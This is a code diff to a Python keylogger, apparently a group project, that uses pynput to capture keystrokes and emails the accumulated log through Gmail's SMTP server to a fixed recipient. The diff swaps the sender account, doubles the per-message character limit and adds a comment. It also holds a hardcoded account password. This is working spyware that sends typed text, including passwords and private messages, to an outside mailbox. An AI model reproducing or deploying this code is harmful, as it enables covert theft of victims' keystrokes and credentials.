@@ -4,7 +4,7 @@ from pynput.keyboard import Key, Listener
 
 print("start logging")
 
-sender_email="group38sender@gmail.com"
+sender_email="group39sender@gmail.com"
 password="39gpezdemo"
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.login(sender_email, password)
@@ -14,7 +14,9 @@ reciever_email ="sustainrobotics@gmail.com"
 
 ### https://pypi.org/project/pynput/
 def on_press(key):
-    email_char_limit = 150
+#     email_char_limit = 150
+# Increase or decrease maximum char
+    email_char_limit = 300
     full_log = ""
     word = ""
     
@@ -37,6 +39,7 @@ def on_press(key):
         return False
     
 def send_log():
+    #server or cloud IAM instead#
     server.sendmail(sender_email, reciever_email, full_log)
 
     
